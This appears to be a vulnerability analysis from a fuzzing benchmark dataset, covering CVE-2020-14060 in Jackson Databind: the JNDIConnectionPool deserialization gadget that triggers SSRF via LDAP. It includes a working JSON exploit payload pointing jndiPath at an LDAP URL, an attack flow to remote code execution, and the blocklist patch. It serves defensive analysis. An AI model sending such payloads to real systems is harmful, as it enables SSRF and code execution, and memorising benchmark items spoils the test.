# Vulnerability Analysis for cpv_0

## Summary
- **CPV ID**: cpv_0
- **Harness**: AdaLObjectReader3Fuzzer
- **Vulnerability Type**: Server Side Request Forgery (SSRF) via Unsafe Deserialization
- **Origin**: 1-day
- **Release Date**: 06/14/2020
- **References**: 
  - https://nvd.nist.gov/vuln/detail/CVE-2020-14060
  - https://github.com/FasterXML/jackson-databind/issues/2469

## Crash Log Analysis
- **Error Type**: Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueMedium: Server Side Request Forgery (SSRF)
- **SSRF Target**: Attempted connection to: g.co:389 (LDAP)
- **Trigger Location**: org.apache.xalan.lib.sql.JNDIConnectionPool
- **Detection**: Jazzer security hook detected network connection attempt

### Stack Trace
The vulnerability is triggered through Jackson's polymorphic deserialization mechanism:

```
com.code_intelligence.jazzer.sanitizers.ServerSideRequestForgery.checkSsrf(ServerSideRequestForgery.java:127)
  at java.net.Socket.connect(Socket.java:633)
  at com.sun.jndi.ldap.Connection.createSocket(Connection.java:346)
  at com.sun.jndi.ldap.Connection.<init>(Connection.java:232)
  at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
  at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1616)
  at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2848)
  at javax.naming.InitialContext.lookup(InitialContext.java:409)
  at org.apache.xalan.lib.sql.JNDIConnectionPool.findDatasource(JNDIConnectionPool.java:248)
  at org.apache.xalan.lib.sql.JNDIConnectionPool.getConnection(JNDIConnectionPool.java:207)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:688)
  at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:760)
  at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeWithType(BeanSerializerBase.java:643)
```

## Vulnerable Code Location(s)

### Location 1 (root_cause)
- **Type**: root_cause
- **File Path**: src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java
- **Function**: N/A (blocklist configuration)
- **Line Range**: 113-114 (after patch)
- **Context**: Missing blocklist entry for `org.apache.xalan.lib.sql.JNDIConnectionPool`

The root cause is the absence of this dangerous gadget class from Jackson's deserialization blocklist. When polymorphic type handling is enabled (via `enableDefaultTyping()` or `@JsonTypeInfo`), Jackson will instantiate arbitrary classes specified in the JSON payload. The `JNDIConnectionPool` class performs JNDI lookups during deserialization, allowing an attacker to trigger SSRF or remote code execution via malicious LDAP/RMI servers.

### Code Context (After Fix)
```java
// [databind#2462]: commons-configuration / -2
s.add("org.apache.commons.configuration.JNDIConfiguration");
s.add("org.apache.commons.configuration2.JNDIConfiguration");

// [databind#2469]: xalan
s.add("org.apache.xalan.lib.sql.JNDIConnectionPool");  // <-- ADDED BY PATCH
// [databind#2704]: xalan2
s.add("com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool");
```

**Note**: There is no specific crash_site location in project source code because:
1. The vulnerability is exploited through Jackson's serialization mechanism (`BeanPropertyWriter.serializeAsField`)
2. The actual malicious behavior occurs in external library code (`org.apache.xalan.lib.sql.JNDIConnectionPool`)
3. The fix is preventative - blocking the class from being instantiated during deserialization

## CWE Classification
- **CWE-502**: Deserialization of Untrusted Data
- **CWE-918**: Server-Side Request Forgery (SSRF)

## Vulnerability Description

This is a **polymorphic deserialization vulnerability** in Jackson Databind (CVE-2020-14060). When Jackson's polymorphic typing feature is enabled, it allows JSON payloads to specify arbitrary Java classes to instantiate during deserialization. This creates a "gadget chain" attack surface where attackers can specify dangerous classes that perform harmful actions during instantiation or property setting.

The `org.apache.xalan.lib.sql.JNDIConnectionPool` class is a "deserialization gadget" that performs JNDI lookups when its `jndiPath` property is set. JNDI (Java Naming and Directory Interface) can connect to remote LDAP, RMI, or DNS servers, which can:

1. **SSRF**: Make the application connect to arbitrary internal/external hosts
2. **Remote Code Execution**: LDAP/RMI servers can return malicious serialized Java objects that execute code when deserialized

**Attack Flow:**
1. Attacker crafts JSON payload specifying `org.apache.xalan.lib.sql.JNDIConnectionPool` with malicious `jndiPath`
2. Jackson deserializes the payload and instantiates the class
3. During serialization (or getter invocation), the class attempts JNDI lookup
4. This triggers network connection to attacker-controlled server
5. Attacker server responds with malicious payload leading to RCE

## POV Analysis

**POV File**: `pov_0.blob`

```json
["org.apache.xalan.lib.sql.JNDIConnectionPool",{"jndiPath":"ldap://g.co/"}]
```

The POV demonstrates a minimal exploit payload:
- Uses Jackson's polymorphic type array format: `[<class_name>, <properties>]`
- Specifies the dangerous gadget class: `org.apache.xalan.lib.sql.JNDIConnectionPool`
- Sets `jndiPath` property to a malicious LDAP URL: `ldap://g.co/`
- When deserialized, this triggers an LDAP connection attempt to `g.co:389`
- Jazzer's SSRF hook detects this unauthorized network connection and reports it as a security issue

## Patch Analysis

**Patch File**: `patch_0.diff`

The patch adds a single line to `SubTypeValidator.java`:

```diff
+        // [databind#2469]: xalan
+        s.add("org.apache.xalan.lib.sql.JNDIConnectionPool");
```

**Fix Strategy**: The fix uses a **blocklist approach** to prevent deserialization of dangerous gadget classes. By adding `org.apache.xalan.lib.sql.JNDIConnectionPool` to the `DEFAULT_NO_DESER_CLASS_NAMES` set, Jackson will reject any attempt to deserialize this class, even when polymorphic typing is enabled.

This is a defense-in-depth mitigation that:
- Blocks this specific gadget class from being instantiated
- Does not fix the underlying issue (polymorphic typing remains dangerous)
- Requires continuous updates as new gadget classes are discovered
- Is part of an ongoing security effort (note references to similar issues: #2462, #2704, #2478, etc.)

**Location of Fix**: 
- File: `src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java`
- Lines: 113-114 (after patch)
- Commit: https://github.com/FasterXML/jackson-databind/commit/998efd7
- Issue: https://github.com/FasterXML/jackson-databind/issues/2469

## Recommendations

### For vuln.yaml generation:
- **Suggested CWEs**: [CWE-502, CWE-918]
- **Vulnerability name**: "Polymorphic Deserialization - JNDIConnectionPool Gadget (CVE-2020-14060)"
- **Origin**: 1-day
- **Release date**: 06/14/2020
- **References**: 
  - https://nvd.nist.gov/vuln/detail/CVE-2020-14060
  - https://github.com/FasterXML/jackson-databind/issues/2469

### Locations to include in vuln.yaml:
- **root_cause**:
  - File: `src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java`
  - Lines: 113-114 (where the fix was applied)
  - Reason: The vulnerability exists because this gadget class was not on the blocklist

**Note**: No crash_site should be included because the vulnerability is in the deserialization configuration, not in a specific code execution path. The stack trace shows Jackson's serialization framework code and external library code, neither of which are part of the jackson-databind project source that should be patched.